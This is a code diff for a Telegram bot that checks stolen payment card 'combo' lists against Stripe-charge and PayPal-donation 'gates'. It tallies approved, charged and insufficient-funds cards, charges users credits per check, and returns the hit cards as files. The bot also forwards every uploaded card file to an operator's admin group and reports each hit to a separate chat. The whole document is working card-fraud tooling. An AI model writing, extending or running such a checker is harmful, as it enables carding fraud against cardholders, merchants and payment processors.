@@ -5,18 +5,19 @@ import multiprocessing
 from concurrent.futures import ThreadPoolExecutor
 from telebot import types
 from utils.admin_guard import is_admin
-from utils.classify import *
 from storage.repositories.bans import is_banned
-from security.channel_guard import *
-from storage.repositories.credits import *
-from storage.repositories.gates import *
+from security.channel_guard import is_channel_subscribed, send_channel_prompt
+from storage.repositories.credits import get_credits, ensure_row, is_vip_active, deduct_credits
+from storage.repositories.gates import is_gate_enabled, get_limit, get_cost
 from datetime import datetime
 from config.settings import ADMIN_GROUP, HIT_CHAT
+from utils.classify import classify_result
 from utils.messages import (
     approved_message,
     charged_message,
     insufficient_funds_message,
-    dato, hit_detected_message
+    hit_detected_message,
+    get_user_name
 )
 from collections import defaultdict
 from threading import Lock
@@ -29,11 +30,10 @@ from gates.stripe_charge import check as stripe_charge_check
 from gates.paypal_donation import check as paypal_donation_check
 
 # ==================== Global ====================
-MAX_THREADS = 20
+MAX_THREADS = 15
 cpu_count = multiprocessing.cpu_count()
 max_threads = min(MAX_THREADS, max(1, cpu_count if cpu_count else 1))
 executor = ThreadPoolExecutor(max_workers=max_threads)
-print(f"Using {max_threads} threads based on CPU cores.")
 
 user_locks = defaultdict(Lock)
 sessions = {}
@@ -69,34 +69,6 @@ def build_progress(percent: int, size: int = 10):
     filled = int((percent / 100) * size)
     return f"{'▰' * filled}{'▱' * (size - filled)} {percent}%"
 
-# ================= UPDATE UI ====================
-def update_progress_ui(uid, chat_id, message_id, card, result, gate_name, total, gate_type, force_update=False):
-    session = sessions.get(uid)
-    if not session: return
-
-    percent = int((session.checked / total) * 100) if total else 0
-    progress_bar = build_progress(percent)
-
-    kb = types.InlineKeyboardMarkup(row_width=1)
-    kb.add(
-        types.InlineKeyboardButton(f"━ 𝗖𝗖 • {card}", callback_data="x"),
-        types.InlineKeyboardButton(f"━ 𝗦𝗧𝗔𝗧𝗨𝗦 • {result}", callback_data="x"),
-        types.InlineKeyboardButton(f"━ {'𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅' if gate_type=='AUTH' else '𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ⚡'} • {session.approved if gate_type=='AUTH' else session.charged}", callback_data="x"),
-        types.InlineKeyboardButton(f"━ {'𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌' if gate_type=='AUTH' else '𝗙𝗨𝗡𝗗𝗦 💸'} • {session.declined if gate_type=='AUTH' else session.funds}", callback_data="x"),
-        types.InlineKeyboardButton(f"━ 𝗧𝗢𝗧𝗔𝗟 ⚡ • {session.checked} / {total}", callback_data="x"),
-        types.InlineKeyboardButton("⛔ 𝗦𝗧𝗢𝗣 𝗖𝗛𝗘𝗖𝗞", callback_data="combo:stop"),
-    )
-
-    try:
-        bot_instance.edit_message_text(
-            f"<b>CHECKING CARDS 💫\nGATE ➜ {gate_name}\n\n━━━━━━━━━━━━\n{progress_bar}\n━━━━━━━━━━━━</b>",
-            chat_id, message_id, reply_markup=kb, parse_mode="HTML"
-        )
-    except Exception as e:
-        if not force_update:
-            print(f"UI update skipped: {e}")
-
-# ================= REGISTER COMBO =================
 def register_combo(bot):
     global bot_instance
     bot_instance = bot
@@ -105,8 +77,18 @@ def register_combo(bot):
     def receive_combo(message):
         uid = message.from_user.id
         user = message.from_user
+        user_name = user.first_name
         now = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
         
+        # Security Checks
+        if is_banned(uid):
+            bot.send_message(message.chat.id, "<b>🚫 YOU ARE BANNED FROM USING THIS BOT</b>", parse_mode="HTML")
+            return
+
+        if not is_channel_subscribed(bot, uid):
+            send_channel_prompt(bot, message.chat.id, user_name)
+            return
+
         caption = f"""
 📥 <b>NEW FILE RECEIVED</b>
 
@@ -118,23 +100,15 @@ def register_combo(bot):
         """
         
         try:
-            bot_instance.send_document(ADMIN_GROUP, admin_bio, caption=caption, parse_mode="HTML")
+            bot.send_document(ADMIN_GROUP, message.document.file_id, caption=caption, parse_mode="HTML")
         except Exception as e:
-            print(f"⚠️ Could not send file to admin group {ADMIN_GROUP}: {e}")
+            print(f"⚠️ Could not send to admin group {ADMIN_GROUP}: {e}")
 
         file_name = message.document.file_name.lower()
         if not file_name.endswith(".txt"):
             bot.send_message(message.chat.id, "<b>❌ ONLY .TXT FILES ARE ALLOWED</b>", parse_mode="HTML")
             return
 
-        if is_banned(uid):
-            bot.send_message(message.chat.id, "<b>🚫 YOU ARE BANNED FROM USING THIS BOT</b>", parse_mode="HTML")
-            return
-            
-        if not is_channel_subscribed(bot, uid):
-            send_channel_prompt(bot, message.chat.id, user.first_name)
-            return
-            
         if uid in sessions and sessions[uid].checking:
             bot.send_message(message.chat.id, "<b>❌ A CHECK IS ALREADY RUNNING</b>", parse_mode="HTML")
             return
@@ -177,6 +151,7 @@ def register_combo(bot):
     @bot.callback_query_handler(func=lambda c: c.data.startswith("combo:gate:"))
     def start_check(c):
         uid = c.from_user.id
+        user_name = get_user_name(c.from_user)
         gate_key = c.data.split(":")[-1]
 
         session = sessions.get(uid)
@@ -185,18 +160,12 @@ def register_combo(bot):
             return
 
         gate_name, gate_func, gate_type = GATES[gate_key]
-        limit = get_limit(gate_key) or len(session.cards)
-        total = len(session.cards) if is_admin(uid) else min(len(session.cards), limit)
+        total = len(session.cards) if is_admin(uid) else min(len(session.cards), get_limit(gate_key))
         cost = get_cost(gate_key)
 
-        # ===== DEBUG =====
-        print(f"[DEBUG] User {uid} | Gate {gate_key} | Total {total} | Cards in file {len(session.cards)} | Cost per card {cost}")
-
-        # ✅ Check credits only for at least 1 card
-        with user_locks[uid]:
-            if not is_admin(uid) and get_credits(uid) < cost:
-                bot.answer_callback_query(c.id, "⛔ Insufficient credits to start the check.", show_alert=True)
-                return
+        if not is_admin(uid) and get_credits(uid) < cost * total:
+            bot.answer_callback_query(c.id, "⛔ Insufficient credits for this check.", show_alert=True)
+            return
 
         session.checking = True
         session.stop = False
@@ -204,13 +173,24 @@ def register_combo(bot):
         chat_id = c.message.chat.id
         message_id = c.message.message_id
 
-        # ===== فور بدء الفحص حدث الـ UI مباشرة =====
-        update_progress_ui(uid, chat_id, message_id, "Starting...", "Initializing...", gate_name, total, gate_type, force_update=True)
+        kb = types.InlineKeyboardMarkup(row_width=1)
+        kb.add(
+            types.InlineKeyboardButton("━ 𝗖𝗖 • 𝗪𝗔𝗜𝗧𝗜𝗡𝗚...", callback_data="x"),
+            types.InlineKeyboardButton("━ 𝗦𝗧𝗔𝗧𝗨𝗦 • 𝗪𝗔𝗜𝗧𝗜𝗡𝗚...", callback_data="x"),
+            types.InlineKeyboardButton(f"━ {'𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅' if gate_type == 'AUTH' else '𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ⚡'} • 0", callback_data="x"),
+            types.InlineKeyboardButton(f"━ {'𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌' if gate_type == 'AUTH' else '𝗙𝗨𝗡𝗗𝗦 💸'} • 0", callback_data="x"),
+            types.InlineKeyboardButton(f"━ 𝗧𝗢𝗧𝗔𝗟 ⚡ • 0 / {total}", callback_data="x"),
+            types.InlineKeyboardButton("⛔ 𝗦𝗧𝗢𝗣 𝗖𝗛𝗘𝗖𝗞", callback_data="combo:stop"),
+        )
 
-        executor.submit(run_check, uid, chat_id, message_id, gate_key, total, cost)
+        bot.edit_message_text(
+            f"<b>PLEASE WAIT CHECKING YOUR CARDS 💫\nGATE ➜ {gate_name}\n\n━━━━━━━━━━━━━━━━━━━━━━━\n{build_progress(0)}\n━━━━━━━━━━━━━━━━━━━━━━━</b>",
+            chat_id, message_id, reply_markup=kb, parse_mode="HTML"
+        )
 
-# ================= RUN CHECK =================
-def run_check(uid, chat_id, message_id, gate_key, total, cost):
+        executor.submit(run_check, uid, chat_id, message_id, gate_key, total, cost, user_name)
+
+def run_check(uid, chat_id, message_id, gate_key, total, cost, user_name):
     session = sessions.get(uid)
     if not session: return
 
@@ -234,7 +214,7 @@ def run_check(uid, chat_id, message_id, gate_key, total, cost):
 
             for _ in range(MAX_RETRY):
                 try:
-                    r_text = gate_func(card)
+                    r_text = str(gate_func(card))
                     if r_text and "error" not in r_text.lower():
                         break
                 except Exception:
@@ -242,46 +222,44 @@ def run_check(uid, chat_id, message_id, gate_key, total, cost):
                 time.sleep(0.5)
 
             exec_time = round(time.time() - start_time, 2)
-            result_status = classify_result(r_text)
             
+            # --- Classification ---
+            status = classify_result(r_text)
             message_to_send = None
             hit_type = None
 
             with session.lock:
-                if result_status == "CHARGED":
+                if status == "CHARGED":
                     session.charged += 1
                     session.charged_cards.append(card)
-                    message_to_send = charged_message(card, r_text, gate_name, exec_time, dato)
+                    message_to_send = charged_message(card, r_text, gate_name, exec_time, user_name)
                     hit_type = "charged"
-                elif result_status == "APPROVED":
+                elif status == "APPROVED":
                     session.approved += 1
                     session.approved_cards.append(card)
-                    message_to_send = approved_message(card, r_text, gate_name, exec_time, dato)
+                    message_to_send = approved_message(card, r_text, gate_name, exec_time, user_name)
                     hit_type = "approved"
-                elif result_status == "FUNDS":
+                elif status == "FUNDS":
                     session.funds += 1
                     session.funds_cards.append(card)
-                    message_to_send = insufficient_funds_message(card, r_text, gate_name, exec_time, dato)
+                    message_to_send = insufficient_funds_message(card, r_text, gate_name, exec_time, user_name)
                     hit_type = "funds"
                 else:
                     session.declined += 1
                 
                 session.checked += 1
 
-            # Send hit messages
             if message_to_send:
                 try:
                     bot_instance.send_message(chat_id, message_to_send, parse_mode="HTML")
-                    bot_instance.send_message(HIT_CHAT, hit_detected_message(uid, hit_type, exec_time, gate_name), parse_mode="HTML")
+                    bot_instance.send_message(HIT_CHAT, hit_detected_message(user_name, hit_type, exec_time, gate_name), parse_mode="HTML")
                 except Exception as e:
                     print(f"Error sending hit message: {e}")
 
-            # Deduct credits per card
             if not is_admin(uid) and not is_vip_active(uid) and "error" not in r_text.lower():
                 with user_locks[uid]:
                     deduct_credits(uid, cost)
 
-            # Update progress UI every 2s
             if time.time() - last_update_time >= 2:
                 last_update_time = time.time()
                 update_progress_ui(uid, chat_id, message_id, card, r_text, gate_name, total, gate_type)
@@ -289,7 +267,7 @@ def run_check(uid, chat_id, message_id, gate_key, total, cost):
     finally:
         session.checking = False
         update_progress_ui(uid, chat_id, message_id, "N/A", "Finished", gate_name, total, gate_type, force_update=True)
-
+        
         summary_text = f"<b>✨ CHECK SUMMARY ✨</b>\n" \
                        f"━━━━━━━━━━━━━━━━━━\n" \
                        f"Approved  ✅ : {session.approved}\n" \
@@ -301,12 +279,52 @@ def run_check(uid, chat_id, message_id, gate_key, total, cost):
                        f"━━━━━━━━━━━━━━━━━━"
         try:
             bot_instance.send_message(chat_id, summary_text, parse_mode="HTML")
-        except Exception as e:
-            print(f"Error sending summary: {e}")
+            # Send result files if any hits
+            if session.approved_cards or session.charged_cards or session.funds_cards:
+                send_result_files(uid, chat_id)
+        except: pass
 
-        send_file(uid, chat_id, "approved", session.approved_cards, gate_name, session.original_filename)
-        send_file(uid, chat_id, "charged", session.charged_cards, gate_name, session.original_filename)
-        send_file(uid, chat_id, "funds", session.funds_cards, gate_name, session.original_filename)
+def update_progress_ui(uid, chat_id, message_id, card, status, gate_name, total, gate_type, force_update=False):
+    session = sessions.get(uid)
+    if not session: return
+    
+    percent = int((session.checked / total) * 100) if total > 0 else 0
+    
+    kb = types.InlineKeyboardMarkup(row_width=1)
+    kb.add(
+        types.InlineKeyboardButton(f"━ 𝗖𝗖 • {card}", callback_data="x"),
+        types.InlineKeyboardButton(f"━ 𝗦𝗧𝗔𝗧𝗨𝗦 • {status}", callback_data="x"),
+        types.InlineKeyboardButton(f"━ {'𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅' if gate_type == 'AUTH' else '𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ⚡'} • {session.approved if gate_type == 'AUTH' else session.charged}", callback_data="x"),
+        types.InlineKeyboardButton(f"━ {'𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌' if gate_type == 'AUTH' else '𝗙𝗨𝗡𝗗𝗦 💸'} • {session.declined if gate_type == 'AUTH' else session.funds}", callback_data="x"),
+        types.InlineKeyboardButton(f"━ 𝗧𝗢𝗧𝗔𝗟 ⚡ • {session.checked} / {total}", callback_data="x"),
+        types.InlineKeyboardButton("⛔ 𝗦𝗧𝗢𝗣 𝗖𝗛𝗘𝗖𝗞", callback_data="combo:stop"),
+    )
 
-        if uid in sessions:
-            del sessions[uid]
+    try:
+        bot_instance.edit_message_text(
+            f"<b>PLEASE WAIT CHECKING YOUR CARDS 💫\nGATE ➜ {gate_name}\n\n━━━━━━━━━━━━━━━━━━━━━━━\n{build_progress(percent)}\n━━━━━━━━━━━━━━━━━━━━━━━</b>",
+            chat_id, message_id, reply_markup=kb, parse_mode="HTML"
+        )
+    except: pass
+
+def send_result_files(uid, chat_id):
+    session = sessions.get(uid)
+    if not session: return
+    
+    if session.approved_cards:
+        content = "\n".join(session.approved_cards)
+        bio = io.BytesIO(content.encode())
+        bio.name = "Approved.txt"
+        bot_instance.send_document(chat_id, bio)
+        
+    if session.charged_cards:
+        content = "\n".join(session.charged_cards)
+        bio = io.BytesIO(content.encode())
+        bio.name = "Charged.txt"
+        bot_instance.send_document(chat_id, bio)
+
+    if session.funds_cards:
+        content = "\n".join(session.funds_cards)
+        bio = io.BytesIO(content.encode())
+        bio.name = "Funds.txt"
+        bot_instance.send_document(chat_id, bio)
